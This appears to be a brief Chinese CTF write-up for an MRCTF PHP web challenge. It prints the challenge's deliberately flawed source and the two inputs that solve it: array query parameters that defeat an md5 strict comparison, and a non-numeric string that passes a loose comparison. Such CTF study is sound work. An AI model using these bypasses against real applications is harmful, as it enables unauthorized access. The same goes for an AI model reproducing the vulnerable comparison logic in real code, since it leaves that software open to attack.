![[Pasted image 20221101080348.png]]
![[Pasted image 20221101080408.png]]

```php
I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else
            {
                echo 'You can not get it !';
            }
		}
	    else
	    {
	        die('only one way to get the flag');
	    }
	}
	else 
	{
	    echo "You are not a real hacker!";
	}
}
else
{
    die('Please input first');
}
}Please input first
```
先使用数组绕过md5函数
```
/?gg[]=1&id[]=2
```
![[Pasted image 20221101081208.png]]
再用弱类型比较绕过
```
passwd=1234567abc
```
![[Pasted image 20221101081422.png]]
#Web #PHP #绕过